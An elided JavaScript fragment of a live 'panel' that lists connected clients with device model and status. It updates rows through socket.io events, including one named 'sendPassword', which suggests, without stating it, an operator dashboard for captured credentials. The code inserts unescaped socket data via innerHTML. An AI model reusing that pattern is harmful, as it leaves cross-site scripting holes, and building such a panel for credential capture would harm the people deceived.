...
const panel = (() => {
    ...
    function createClient(client) {
        ...
        <td role="device">
            <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="Modelo: Desconhecido">
            Desconhecido
            </span>
    ...
    function receiver() {
        ...
        socket.on('userReconnect', (data) => {
            setTimeout(() => {
                ...
                item.querySelector(`td[role='status'] span`).innerHTML = data.status
            }, 300)
        })
        ...
        socket.on('updateClient', (data) => {
            ...
            setTimeout(() => {
                if (lineClient) {
                    ...
                    lineClient.querySelector(`td[role='status']`).innerHTML = `<span>${data.status}</span>`
                }
        ...
        socket.on('sendPassword', (client) => {
            ...
            if (command) command.innerHTML = `<span>${client.status}</span>`
        })
